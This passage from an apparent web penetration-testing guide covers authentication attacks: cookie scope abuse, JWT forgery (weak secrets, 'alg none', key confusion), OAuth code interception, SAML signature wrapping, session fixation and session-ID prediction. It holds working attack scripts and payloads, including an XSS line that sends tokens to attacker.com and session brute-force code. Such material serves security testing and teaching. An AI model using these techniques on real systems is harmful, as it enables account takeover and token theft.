curl -b "sessionid=STOLEN_VALUE" https://target.com/api/profile
```

**Cookie Scope Bypass**

```bash
# Domain/Path scope testing
# If cookie set: Domain=.target.com; Path=/admin
# Verify if accessible from: subdomain.target.com/admin/path

# Subdomain takeover â†’ cookie access
# Attacker takes over subdomain.target.com
# Cookies scoped to .target.com now accessible by attacker

# Path traversal via cookie
# If Path=/admin, test if cookie used for /admin/../other_path
curl -b "sessionid=VALUE" https://target.com/admin/../api/users

# Cookie tossing (multiple cookies with same name)
curl -b "sessionid=LEGIT" -b "sessionid=ATTACKER" https://target.com
# Server behavior depends on implementation
# Some use first, some use last, some merge values
```

---

## JWT (JSON Web Tokens)

JWT is a standardized token format consisting of header.payload.signature. Cryptographic weaknesses and implementation flaws enable token forgery and privilege escalation.

**JWT Structure**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Decode JWT components:

```bash
# Install JWT tools
pip3 install pyjwt

# Decode JWT manually (Base64 decode)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d | jq
# Output: {"alg":"HS256","typ":"JWT"}

echo "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ==" | base64 -d | jq
# Output: {"sub":"1234567890","name":"John Doe","iat":1516239022}

# Online JWT decoder (caution: submits token to external service)
# https://jwt.io/

# CLI JWT decoding
python3 << 'EOF'
import jwt
import json
import base64

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Decode without verification (shows claims)
decoded = jwt.decode(token, options={"verify_signature": False})
print(json.dumps(decoded, indent=2))
EOF
```

**JWT Algorithm Vulnerabilities**

**HS256 (HMAC-SHA256) Shared Secret Exploitation**

```bash
# If JWT uses HS256 with weak/guessable secret
# Attacker can forge tokens by recalculating signature

python3 << 'EOF'
import jwt
import json

# Decode captured token
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ"

# Attempt common secrets
common_secrets = ["secret", "Secret123", "password", "admin", "jwt_secret", "changeme"]

for secret in common_secrets:
    try:
        decoded = jwt.decode(token, secret, algorithms=["HS256"])
        print(f"SUCCESS! Secret found: {secret}")
        print(f"Payload: {json.dumps(decoded, indent=2)}")
    except jwt.InvalidSignatureError:
        continue

# Forge new token with modified claims
forged_payload = {
    "sub": "admin",
    "role": "administrator",
    "iat": 1234567890
}
forged_token = jwt.encode(forged_payload, "secret", algorithm="HS256")
print(f"Forged token: {forged_token}")
EOF

# Wordlist-based secret cracking
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py <JWT_TOKEN> -C -d wordlist.txt
```

**RS256 (RSA) Key Confusion**

```bash
# Vulnerability: Server accepts both RS256 and HS256
# Attacker uses public RSA key as HMAC secret

python3 << 'EOF'
import jwt
import json

# Extract public key from certificate/JWKS endpoint
# GET /path/.well-known/jwks.json
# curl -s https://target.com/.well-known/jwks.json | jq

# If RS256 public key available, attempt HS256 with same key
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# Forge token using public key as HMAC secret
forged_payload = {"sub": "admin", "role": "admin"}
forged_token = jwt.encode(forged_payload, public_key, algorithm="HS256")
print(f"Forged token: {forged_token}")

# Send forged token to server
# If server accepts HS256 tokens, authentication bypassed
EOF

# Tool: jwt_tool with RS256 vulnerability testing
python3 jwt_tool.py <JWT_TOKEN> -X a  # Algorithm confusion attack
```

**None Algorithm**

```bash
# Vulnerability: "alg":"none" disables signature verification
# Attacker crafts token with no signature requirement

python3 << 'EOF'
import jwt
import json
import base64

# Manually craft JWT with alg=none
header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
payload = base64.urlsafe_b64encode(b'{"sub":"admin","role":"admin"}').decode().rstrip('=')

# None algorithm: empty signature
token_none = f"{header}.{payload}."
print(f"Token with alg=none: {token_none}")

# Attempt to use this token (many vulnerable servers accept it)
EOF
```

**JWT Signature Bypass Techniques**

```bash
# 1. Remove signature entirely
# eyJhbGciOiJIUzI1NiJ9.payload. (trailing dot, empty signature)

# 2. Modify exp (expiration) claim
python3 << 'EOF'
import jwt
import json
import time
import base64

token = "YOUR_JWT_TOKEN"

# Decode without verification
decoded = jwt.decode(token, options={"verify_signature": False})

# Modify expiration to future date
decoded["exp"] = int(time.time()) + 86400  # +1 day

# Re-encode (without valid signature, but server may not verify)
new_token = jwt.encode(decoded, "fake_secret", algorithm="HS256")
print(f"Modified token: {new_token}")
EOF

# 3. Test with empty secret
python3 << 'EOF'
import jwt
token = "YOUR_JWT_TOKEN"
try:
    decoded = jwt.decode(token, "", algorithms=["HS256"])
    print("Verified with empty secret!")
except jwt.InvalidSignatureError:
    print("Empty secret failed")
EOF
```

**JWT Claims Manipulation**

```bash
# Even if signature valid, claims modification attacks possible

python3 << 'EOF'
import jwt
import json

# Decode and analyze claims
token = "YOUR_JWT_TOKEN"
decoded = jwt.decode(token, options={"verify_signature": False})
print(json.dumps(decoded, indent=2))

# Common claims to test manipulation:
# - "role": "user" â†’ "role": "admin"
# - "uid": 123 â†’ "uid": 1 (admin user)
# - "email": "attacker@example.com" â†’ "email": "admin@example.com"
# - "is_premium": false â†’ "is_premium": true

# Create modified payload
modified = decoded.copy()
modified["role"] = "admin"

# Sign with weak secret (if known/guessed)
new_token = jwt.encode(modified, "weak_secret", algorithm="HS256")
EOF
```

**JWKS Endpoint Abuse**

```bash
# JWKS (JSON Web Key Set) endpoints sometimes misconfigured

# Discover JWKS endpoint
curl -s https://target.com/.well-known/jwks.json | jq

# Check if endpoint allows key injection
# Some endpoints accept attacker-controlled keys
# Attacker supplies their own public key, server uses it for verification

# Test for missing key validation
# Obtain server's public key (from JWKS or certificate)
# Generate attacker-controlled RSA keypair
# Forge JWT with attacker's private key
# Server may verify against attacker's injected public key

openssl genrsa -out attacker_private.pem 2048
openssl rsa -in attacker_private.pem -pubout -out attacker_public.pem

# Extract public key and attempt injection via JWKS endpoint
# (requires knowledge of JWKS modification mechanism)
```

**JWT Reuse & Token Fixation**

```bash
# Capture valid JWT from one user
# Attempt reuse in different context
curl -H "Authorization: Bearer TOKEN_FROM_USER1" https://target.com/api/user/2/profile

# Test for privilege escalation
# Obtain JWT from low-privilege user
# Modify role/permission claims
# Attempt to access restricted endpoints

# Check for token sharing across services
# Single JWT used for multiple microservices
# Compromise one service = access to all
```

---

## OAuth 2.0

OAuth 2.0 delegates authentication to external providers (Google, GitHub, Facebook). Implementation flaws enable authentication bypass, token theft, and account linkage attacks.

**OAuth 2.0 Flow Overview**

```
1. User clicks "Login with Google"
2. Client redirects to: https://accounts.google.com/o/oauth2/auth?
   client_id=12345&redirect_uri=https://app.com/callback&scope=email profile
3. User authenticates and grants permission
4. Google redirects to: https://app.com/callback?code=AUTH_CODE
5. Backend exchanges code for access token: 
   POST /token HTTP/1.1
   client_id=12345&client_secret=SECRET&code=AUTH_CODE
6. Backend receives access_token, creates session
```

**OAuth Parameter Tampering**

```bash
# 1. Redirect URI Validation Bypass
# If redirect_uri validation weak, attacker intercepts authorization code

# Legitimate: redirect_uri=https://app.com/callback
# Bypass attempt: redirect_uri=https://attacker.com/callback
# Or: redirect_uri=https://app.com.attacker.com/callback
# Or: redirect_uri=https://app.com/callback?attacker.com

# Capture intercepted auth code and exchange for access token
curl -X POST https://accounts.google.com/o/oauth2/token \
  -d "client_id=12345&client_secret=SECRET&code=INTERCEPTED_CODE&grant_type=authorization_code"

# 2. Missing state Parameter
# state=random_value prevents CSRF attacks
# If missing, attacker crafts authorization URL and tricks user into clicking

# Attacker URL: https://app.com/login?oauth_id=attacker_id
# User clicks, backend creates account for attacker
# Attacker logs in as legitimate user

# 3. Scope Escalation
# Request excessive scopes user didn't authorize
# scope=email profile â†’ scope=email profile calendar admin

curl "https://accounts.google.com/o/oauth2/auth?
  client_id=12345&
  redirect_uri=https://app.com/callback&
  scope=email profile calendar contacts"
```

**Authorization Code Interception**

```bash
# Authorization codes valid only briefly (typically minutes)
# But interception/reuse attempts occur in CTF scenarios

# Capture authorization code
# Set up listener on attacker-controlled redirect_uri
python3 << 'EOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class OAuthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Parse ?code=AUTH_CODE from URL
        query_params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        auth_code = query_params.get('code', [''])[0]
        print(f"Intercepted authorization code: {auth_code}")
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Authorization code captured!")

server = HTTPServer(('0.0.0.0', 8080), OAuthHandler)
print("Listening for OAuth callback...")
server.serve_forever()
EOF

# Exchange intercepted code for access token
curl -X POST https://oauth_provider/token \
  -d "client_id=target_client_id&client_secret=target_secret&code=INTERCEPTED_CODE&grant_type=authorization_code"
```

**Access Token Theft & Misuse**

```bash
# 1. Capture access token from callback or storage
# Browser DevTools â†’ Network â†’ Look for access_token in responses/requests
# Local Storage: JSON.stringify(localStorage) in console

# 2. Reuse stolen token
curl -H "Authorization: Bearer STOLEN_ACCESS_TOKEN" \
  https://api.target.com/user/profile

# 3. Token refresh exploitation
# If refresh_token stored insecurely, attacker can obtain new access_tokens

# Burp Suite capture refresh request:
# POST /token HTTP/1.1
# grant_type=refresh_token&refresh_token=REFRESH_TOKEN

# 4. Implicit flow vulnerabilities
# Access token in URL fragment (visible in browser history, referer headers)
# https://app.com/callback#access_token=TOKEN&token_type=Bearer

# Fragment not sent to server but visible client-side
# XSS vulnerability exfiltrates token
<script>
  fetch('https://attacker.com/steal?token=' + location.hash)
</script>
```

**OpenID Connect (OIDC) ID Token Exploitation**

```bash
# OIDC extends OAuth with ID tokens
# ID token is JWT containing user claims

# Decode ID token
python3 << 'EOF'
import jwt
import json

id_token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ..."

# Decode without verification
decoded = jwt.decode(id_token, options={"verify_signature": False})
print(json.dumps(decoded, indent=2))

# Claims often include: sub (subject), email, name, picture
# Attacker modifies claims and resigns with guessed/weak secret
EOF

# If nonce validation missing, attacker can replay/forge ID tokens
# nonce parameter prevents replay: OAuth server includes nonce in ID token
# If missing, old ID tokens reused to impersonate users
```

**Client Credentials Flow Abuse**

```bash
# Some OAuth implementations use client credentials for service-to-service auth
# POST /token HTTP/1.1
# grant_type=client_credentials&client_id=ID&client_secret=SECRET

# If client_secret exposed in source code/config files
# Attacker obtains access tokens with service-level permissions

# Search for exposed credentials
grep -r "client_secret" /path/to/source/
grep -r "client_id" package.json
curl -s https://target.com/config.js | grep -i "client"
```

**OAuth Account Linkage Attacks**

```bash
# Vulnerability: Weak account linking during OAuth enrollment

# Scenario:
# 1. Attacker's account linked to attacker@example.com
# 2. Attacker obtains legitimate user's email via information disclosure
# 3. Attacker requests password reset to user's email
# 4. Attacker uses OAuth "login" linking existing attacker account
# 5. Target user's account now linked to attacker's OAuth provider

# Prevention test: Verify email ownership before OAuth linking
# Check if emails verified via confirmation link
# Monitor for suspicious account linking activities
```

**PKCE (Proof Key for Code Exchange) Bypass**

```bash
# PKCE prevents authorization code interception in public clients
# Added security layer for mobile/SPA applications

# Flow: code_challenge = SHA256(code_verifier)
# Attacker lacking code_verifier cannot exchange intercepted code

# However, some implementations still allow code exchange without PKCE
curl -X POST https://oauth_provider/token \
  -d "client_id=12345&code=INTERCEPTED_CODE&grant_type=authorization_code"

# If no code_verifier required, authorization code alone sufficient
# Test by intercepting code and attempting exchange without PKCE parameters
```

---

## SAML (Security Assertion Markup Language)

### SAML Architecture Overview

SAML enables Single Sign-On (SSO) through XML-based authentication assertions between:

- **Identity Provider (IdP)**: Authenticates users (e.g., Okta, Azure AD)
- **Service Provider (SP)**: Application consuming authentication (e.g., web application)

**Authentication Flow**

1. User accesses SP application
2. SP generates SAML AuthnRequest â†’ IdP
3. User authenticates at IdP
4. IdP generates signed SAML Response â†’ SP
5. SP validates signature and grants access

### SAML Request/Response Structure

**SAML AuthnRequest** (Base64-encoded XML)

```xml
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                    ID="_unique_request_id"
                    Version="2.0"
                    IssueInstant="2025-01-15T12:00:00Z"
                    Destination="https://idp.target.com/sso"
                    AssertionConsumerServiceURL="https://sp.target.com/acs">
  <saml:Issuer>https://sp.target.com</saml:Issuer>
</samlp:AuthnRequest>
```

**SAML Response** (signed assertion)

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                ID="_response_id"
                Version="2.0">
  <saml:Assertion ID="_assertion_id">
    <saml:Subject>
      <saml:NameID>user@target.com</saml:NameID>
    </saml:Subject>
    <saml:Conditions NotBefore="2025-01-15T12:00:00Z"
                     NotOnOrAfter="2025-01-15T12:05:00Z"/>
    <saml:AttributeStatement>
      <saml:Attribute Name="email">
        <saml:AttributeValue>user@target.com</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="role">
        <saml:AttributeValue>admin</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <!-- Digital signature -->
    </ds:Signature>
  </saml:Assertion>
</samlp:Response>
```

### SAML Exploitation Techniques

**Signature Exclusion/Stripping**

[Inference] If signature validation logic checks for presence but not integrity:

```xml
<!-- Remove entire <ds:Signature> block -->
<saml:Assertion ID="_modified_assertion">
  <saml:Subject>
    <saml:NameID>admin@target.com</saml:NameID>
  </saml:Subject>
  <!-- Signature block removed -->
</saml:Assertion>
```

**Testing methodology:**

```bash
# Intercept SAML Response in Burp Suite
# 1. Decode Base64 SAMLResponse parameter
echo "PD94bWwgdmVy..." | base64 -d > saml_response.xml

# 2. Remove <ds:Signature> element
sed -i '/<ds:Signature/,/<\/ds:Signature>/d' saml_response.xml

# 3. Re-encode and replay
cat saml_response.xml | base64 -w 0
```

**Signature Wrapping Attacks (XSW)**

[Inference] Exploits discrepancies between signature validation and assertion processing:

**XSW Attack Types:**

_XSW1 - Cloned Assertion_

```xml
<samlp:Response>
  <saml:Assertion ID="original">
    <!-- Validly signed original assertion -->
    <ds:Signature>
      <ds:Reference URI="#original"/>
    </ds:Signature>
  </saml:Assertion>
  
  <saml:Assertion ID="evil">
    <!-- Unsigned malicious assertion processed first -->
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

_XSW2 - Signature in Extension_

```xml
<samlp:Response>
  <saml:Assertion ID="evil">
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Subject>
    <saml:Extensions>
      <saml:Assertion ID="original">
        <!-- Original signed assertion hidden in extensions -->
        <ds:Signature>
          <ds:Reference URI="#original"/>
        </ds:Signature>
      </saml:Assertion>
    </saml:Extensions>
  </saml:Assertion>
</samlp:Response>
```

**SAML Raider (Burp Suite Extension)**

```
1. Install SAML Raider from BApp Store
2. Intercept SAML Response
3. Send to SAML Raider tab
4. Apply automated XSW attacks:
   - XSW1-8 attack variants
   - Signature removal
   - Certificate cloning
5. Observe application response
```

**Manual XSW Testing**

```bash
# Extract and modify SAML Response
# Intercept in Burp, decode Base64

# Test signature bypass
python3 saml_raider_cli.py --input response.xml --attack xsw1 --output evil.xml

# Re-encode
cat evil.xml | base64 -w 0
```

**XML Comment Injection**

[Inference] Parsers may ignore comments during signature validation but process them during assertion parsing:

```xml
<saml:NameID>admin<!--comment-->@target.com</saml:NameID>
<!-- May validate as user@target.com but process as admin@target.com -->
```

**Certificate Substitution**

[Inference] If SP doesn't properly validate certificate chain:

```bash
# Generate self-signed certificate
openssl req -new -x509 -days 365 -nodes -out evil.crt -keyout evil.key

# Sign modified assertion with attacker key
python3 sign_saml.py --assertion modified.xml --key evil.key --cert evil.crt

# Test if SP accepts arbitrary certificates
```

**Assertion Replay**

[Unverified - timing dependent] If `NotOnOrAfter` validation is weak:

```bash
# Capture valid SAML Response
# Modify timestamps
sed -i 's/NotOnOrAfter=".*"/NotOnOrAfter="2099-12-31T23:59:59Z"/' saml.xml

# Replay with extended validity
```

**Attribute Manipulation**

```xml
<!-- Modify role/group attributes -->
<saml:Attribute Name="role">
  <saml:AttributeValue>admin</saml:AttributeValue>
</saml:Attribute>

<saml:Attribute Name="groups">
  <saml:AttributeValue>administrators</saml:AttributeValue>
</saml:Attribute>
```

### SAML Reconnaissance

**Identifying SAML Implementation**

```bash
# Check for SAML metadata endpoint
curl -s https://target.com/saml/metadata
curl -s https://target.com/metadata.xml
curl -s https://target.com/FederationMetadata/2007-06/FederationMetadata.xml

# Common SAML endpoints
/sso/saml
/saml2/acs
/saml/consume
/auth/saml/callback
```

**Extracting SP Configuration**

```xml
<!-- From metadata.xml -->
<md:EntityDescriptor entityID="https://sp.target.com">
  <md:SPSSODescriptor>
    <md:AssertionConsumerService Binding="HTTP-POST"
                                 Location="https://sp.target.com/acs"
                                 index="0"/>
    <!-- No signature requirement = potential vulnerability -->
  </md:SPSSODescriptor>
</md:EntityDescriptor>
```

**Testing SAML Flow**

```bash
# 1. Initiate SSO
curl -i https://sp.target.com/login

# 2. Capture SAMLRequest parameter
echo "SAMLRequest_value" | base64 -d | gunzip

# 3. Intercept SAML Response POST
# Use Burp Suite HTTP History
```

### SAML Testing Checklist

**Critical Validations to Test:**

- [ ] Signature validation enforced
- [ ] Certificate pinning implemented
- [ ] `NotOnOrAfter` timestamp checked
- [ ] `InResponseTo` matches original request
- [ ] `Recipient` matches SP endpoint
- [ ] `Audience` restriction validated
- [ ] Assertion uniqueness enforced (replay protection)
- [ ] XML parsing secure against XSW

---

## Session Fixation

### Attack Mechanism

Session fixation forces a user to authenticate using an attacker-controlled session identifier. After victim authentication, attacker hijacks the session.

**Attack Flow:**

1. Attacker obtains valid session ID from application
2. Victim is tricked into authenticating with that session ID
3. Application doesn't regenerate session ID after authentication
4. Attacker uses pre-set session ID to access victim's authenticated session

### Session Fixation Vectors

**URL Parameter-Based**

```bash
# Attacker obtains session ID
curl -I https://target.com/
# Set-Cookie: PHPSESSID=attacker_session_123

# Craft malicious link
https://target.com/login?PHPSESSID=attacker_session_123

# Send to victim via phishing
# After victim authenticates, attacker uses same session ID
```

**Cookie-Based (with XSS or subdomain control)**

```html
<!-- Attacker-controlled page on subdomain -->
<script>
document.cookie = "SESSIONID=attacker_controlled_id; domain=.target.com; path=/";
location.href = "https://target.com/login";
</script>
```

**Meta Tag Injection**

```html
<!-- If application reflects unvalidated input -->
<meta http-equiv="Set-Cookie" content="sessionid=fixed_value; path=/">
```

**Hidden Form Field**

```html
<!-- Legacy session management -->
<form action="/login" method="POST">
  <input type="hidden" name="sessionid" value="attacker_session">
  <input type="text" name="username">
  <input type="password" name="password">
</form>
```

### Exploitation Workflow

**Step 1: Identify Session Mechanism**

```bash
# Check if session ID accepted via URL
curl -I "https://target.com/?sessionid=test123"

# Check if session ID accepted via POST
curl -X POST https://target.com/login -d "sessionid=test123&username=user&password=pass"

# Check cookie persistence across authentication
curl -c cookies.txt https://target.com/
grep SESSIONID cookies.txt
# Authenticate and check if same session ID persists
curl -b cookies.txt -c cookies_after.txt -X POST https://target.com/login -d "username=user&password=pass"
diff cookies.txt cookies_after.txt
```

**Step 2: Test Session Regeneration**

```python
import requests

# Initial session
s = requests.Session()
r = s.get("https://target.com/")
initial_session = s.cookies.get('SESSIONID')
print(f"[+] Pre-auth session: {initial_session}")

# Authenticate
s.post("https://target.com/login", data={
    "username": "testuser",
    "password": "testpass"
})

post_auth_session = s.cookies.get('SESSIONID')
print(f"[+] Post-auth session: {post_auth_session}")

if initial_session == post_auth_session:
    print("[!] VULNERABLE: Session ID not regenerated after authentication")
else:
    print("[+] SECURE: Session ID regenerated")
```

**Step 3: Exploitation**

```bash
# Attack scenario
# 1. Attacker obtains session
ATTACKER_SESSION="abc123def456"

# 2. Send malicious link to victim
# https://target.com/login?SESSIONID=abc123def456

# 3. After victim authenticates, attacker accesses with same session
curl -H "Cookie: SESSIONID=abc123def456" https://target.com/dashboard
```

### Session Fixation via HTTP Response Splitting

[Inference] If application reflects session ID in headers without sanitization:

```bash
# Inject CRLF to set cookie
curl "https://target.com/login?redirect=%0d%0aSet-Cookie:%20SESSIONID=fixed_value"
```

### Detection in Burp Suite

**Burp Suite Pro - Scanner**

1. Navigate through authentication flow
2. Review scan results for "Session token not regenerated"
3. Check Issue Details for pre/post-auth tokens

**Manual Testing Steps:**

1. Capture request before login (note session ID)
2. Complete authentication
3. Compare session ID after successful login
4. If identical â†’ vulnerable

### Mitigation Bypass Testing

[Inference] Applications may implement partial fixes:

**Token Regeneration Bypass**

```bash
# Test if old session still valid after regeneration
SESSION_OLD="pre_auth_token"
SESSION_NEW="post_auth_token"

# Check if old token still works
curl -H "Cookie: SESSIONID=$SESSION_OLD" https://target.com/dashboard
```

**Subdomain Session Fixation**

```bash
# If main domain regenerates but subdomain doesn't
# Set cookie on subdomain
curl -H "Cookie: SESSIONID=fixed_token" https://sub.target.com/
# Access main domain
curl -H "Cookie: SESSIONID=fixed_token" https://target.com/dashboard
```

---

## Session Prediction

### Attack Objective

Session prediction exploits weak session ID generation to guess valid session identifiers without authentication.

### Weak Session ID Patterns

**Sequential IDs**

```
Session 1: 1000
Session 2: 1001
Session 3: 1002
# Predictable increment
```

**Timestamp-Based**

```
Session 1: 1705320000
Session 2: 1705320001
Session 3: 1705320002
# Unix timestamp or simple time-based
```

**Encoded Predictable Data**

```bash
# Base64(username + timestamp)
echo -n "admin1705320000" | base64
# YWRtaW4xNzA1MzIwMDAw

# MD5(username + counter)
echo -n "admin1" | md5sum
# Weak hash without salt
```

### Session ID Analysis Methodology

**Step 1: Collect Session Samples**

```python
import requests
import time

sessions = []
for i in range(100):
    r = requests.get("https://target.com/")
    session_id = r.cookies.get('SESSIONID')
    sessions.append({
        'id': session_id,
        'time': time.time()
    })
    print(f"[{i+1}] {session_id}")
    time.sleep(0.1)

with open('sessions.txt', 'w') as f:
    for s in sessions:
        f.write(f"{s['id']}\n")
```

**Step 2: Entropy Analysis**

**Burp Suite Sequencer**

```
1. Capture session token response
2. Send to Sequencer
3. Configure token location (cookie/parameter)
4. Start live capture (minimum 100 tokens)
5. Analyze results:
   - Overall quality
   - Character-level analysis
   - Bit-level analysis
   - Correlation analysis
```

**Manual Bit Analysis**

```python
def analyze_entropy(sessions):
    import math
    from collections import Counter
    
    # Convert to binary
    binary_sessions = []
    for s in sessions:
        binary = bin(int(s, 16))[2:].zfill(128)
        binary_sessions.append(binary)
    
    # Calculate bit transitions
    transitions = []
    for i in range(len(binary_sessions) - 1):
        bits1 = binary_sessions[i]
        bits2 = binary_sessions[i + 1]
        diff = sum(c1 != c2 for c1, c2 in zip(bits1, bits2))
        transitions.append(diff)
    
    avg_transitions = sum(transitions) / len(transitions)
    print(f"[+] Average bit changes: {avg_transitions}")
    
    # Good random: ~64 bits change (for 128-bit token)
    # Weak: <20 bits change
    if avg_transitions < 20:
        print("[!] WEAK: Low entropy detected")
    else:
        print("[+] Appears random")

# Usage
with open('sessions.txt') as f:
    tokens = [line.strip() for line in f]
analyze_entropy(tokens)
```

**Step 3: Pattern Detection**

**Linear Congruential Generator (LCG) Detection**

```python
def test_lcg(sessions):
    # Convert to integers
    nums = [int(s, 16) for s in sessions]
    
    # Test for LCG pattern: X(n+1) = (a * X(n) + c) mod m
    # Check if differences show pattern
    diffs = [nums[i+1] - nums[i] for i in range(len(nums)-1)]
    
    # Check for constant differences
    if len(set(diffs)) < len(diffs) * 0.1:
        print("[!] VULNERABLE: Potential LCG pattern")
        return True
    return False
```

**Time-Based Correlation**

```python
def time_correlation(session_data):
    import numpy as np
    
    timestamps = [s['time'] for s in session_data]
    session_ids = [int(s['id'], 16) for s in session_data]
    
    # Calculate correlation coefficient
    correlation = np.corrcoef(timestamps, session_ids)[0, 1]
    
    print(f"[+] Time correlation: {correlation}")
    if abs(correlation) > 0.7:
        print("[!] VULNERABLE: Strong time correlation")
```

### Exploitation of Weak Sessions

**Sequential Session Brute Force**

```python
import requests
import sys

base_session = int(sys.argv[1], 16)  # Starting session in hex
target_url = "https://target.com/dashboard"

for offset in range(-1000, 1000):
    test_session = hex(base_session + offset)[2:]
    
    r = requests.get(target_url, cookies={'SESSIONID': test_session})
    
    if r.status_code == 200 and "logout" in r.text.lower():
        print(f"[+] VALID SESSION: {test_session}")
        print(f"[+] Username: {extract_username(r.text)}")
```

**Timestamp-Based Prediction**

```python
import time
import hashlib

# If pattern is MD5(timestamp)
def generate_sessions(start_time, count):
    sessions = []
    for i in range(count):
        timestamp = int(start_time) + i
        session = hashlib.md5(str(timestamp).encode()).hexdigest()
        sessions.append(session)
    return sessions

# Generate potential sessions around known authentication time
target_time = 1705320000  # Estimated login time
candidates = generate_sessions(target_time - 3600, 7200)  # Â±1 hour

# Test each candidate
for session in candidates:
    test_session(session)
```

**Encoded Username Prediction**

```python
import base64

# If session = base64(username + secret)
usernames = ['admin', 'user', 'test', 'administrator']
secrets = ['', '123', 'secret', '2025']

for user in usernames:
    for secret in secrets:
        token = base64.b64encode(f"{user}{secret}".encode()).decode()
        print(f"[*] Testing: {token}")
        test_session(token)
```

### Automated Tools

**Patator (Session Brute Force)**

```bash
# Hexadecimal range
patator http_fuzz url="https://target.com/dashboard" \
  header="Cookie: SESSIONID=FILE0" \
  0=sessions.txt \
  -x ignore:code=302

# Numeric range prediction
patator http_fuzz url="https://target.com/api" \
  header="Cookie: sid=RANGE0" \
  0=int:1000-2000:1 \
  -x ignore:code=401
```

**Burp Intruder Session Prediction**

```
1. Capture authenticated request
2. Send to Intruder
3. Mark session cookie as payload position
4. Payload type:
   - Numbers: Sequential/random
   - Brute forcer: Hex range
   - Custom iterator: Generated tokens
5. Start attack
6. Filter by response length/status
```

### Detection Indicators

**Weak Session Characteristics:**

- Length < 128 bits (16 bytes)
- Contains predictable data (username, timestamp)
- Low character diversity
- Sequential or arithmetic progression
- Consistent bit positions unchanged
- Short time to first collision

**Testing Script**

```python
def evaluate_session_strength(sessions):
    import math
    from collections import Counter
    
    lengths = [len(s) for s in sessions]
    avg_length = sum(lengths) / len(lengths)
    
    # Check length
    if avg_length < 32:  # Less than 16 bytes hex-encoded
        print("[!] SHORT: Session ID too short")
    
    # Check entropy
    all_chars = ''.join(sessions)
    char_freq = Counter(all_chars)
    entropy = -sum((count/len(all_chars)) * math.log2(count/len(all_chars)) 
                   for count in char_freq.values())
    
    print(f"[+] Entropy: {entropy:.2f} bits/character")
    if entropy < 3.5:  # Good random hex: ~4 bits/char
        print("[!] LOW ENTROPY: Weak randomness")
    
    # Check duplicates
    if len(sessions) != len(set(sessions)):
        print("[!] DUPLICATES: Collision detected")
```

---

## Cookie Manipulation

### Cookie Structure and Attributes

**Standard Cookie Format**

```http
Set-Cookie: sessionid=abc123; Domain=.target.com; Path=/; Expires=Wed, 15 Jan 2025 12:00:00 GMT; HttpOnly; Secure; SameSite=Strict
```

**Security Attributes:**

- `Secure`: HTTPS only
- `HttpOnly`: No JavaScript access
- `SameSite`: CSRF protection (Strict/Lax/None)
- `Domain`: Scope of cookie validity
- `Path`: URL path restriction

### Cookie Tampering Techniques

**Decoding Common Encodings**

**Base64 Cookies**

```bash
# Decode cookie value
echo "dXNlcm5hbWU9YWRtaW4mcm9sZT11c2Vy" | base64 -d
# Output: username=admin&role=user

# Modify and re-encode
echo -n "username=admin&role=administrator" | base64
# Output: dXNlcm5hbWU9YWRtaW4mcm9sZT1hZG1pbmlzdHJhdG9y
```

**URL-Encoded Cookies**

```bash
# Decode
echo "user%3Dadmin%26role%3Duser" | python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read()))"
# Output: user=admin&role=user

# Modify and re-encode
python3 -c "import urllib.parse; print(urllib.parse.quote('user=admin&role=administrator'))"
```

**Hex-Encoded Cookies**

```bash
# Decode hex
echo "75736572" | xxd -r -p
# Output: user

# Encode modified value
echo -n "admin" | xxd -p
# Output: 61646d696e
```

**JSON Web Tokens (JWT) in Cookies**

```bash
# Decode JWT (header.payload.signature)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

# Decode payload
echo "eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9" | base64 -d
# {"user":"admin","role":"user"}

# See JWT section for exploitation
```

### Privilege Escalation via Cookie Modification

**Simple Role Manipulation**

```bash
# Original cookie
user_data=username:user|role:member

# Modified cookie
user_data=username:user|role:admin

# Test in browser console
document.cookie = "user_data=username:user|role:admin; path=/";
location.reload();
```

**Serialized Object Manipulation**

**PHP Serialized Cookies**

```php
# Original serialized object
O:4:"User":2:{s:4:"name";s:4:"user";s:4:"role";s:6:"member";}

# Decode structure:
# Object "User" with 2 properties:
